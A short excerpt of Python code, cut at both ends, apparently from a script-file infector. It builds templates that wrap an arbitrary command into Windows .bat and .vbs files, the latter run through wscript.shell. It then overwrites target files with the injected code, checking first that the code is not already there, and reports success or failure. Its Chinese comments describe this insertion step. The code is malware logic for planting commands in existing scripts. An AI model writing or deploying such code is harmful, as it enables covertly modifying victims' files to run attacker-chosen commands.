...
file_types = {}
file_types['.bat'] = '\n%s\n' % command
file_types['.vbs'] = '\nwscript.createobject("wscript.shell").run("%s")\n' % command

def inject_code(full_filename, extension, contents):

    # 判断文件内容是否已经插入过了代码，如果插入过代码了就不在插入了
    if file_types[extension] in contents:
        return True
    # 如果没有插入代码，那么插入代码
    ...
    try:
        with open(full_filename, 'w') as f:
            f.write(contents)
        print('[+] Inject code success')
    except:
        print('[-] Inject code failed')
    return True
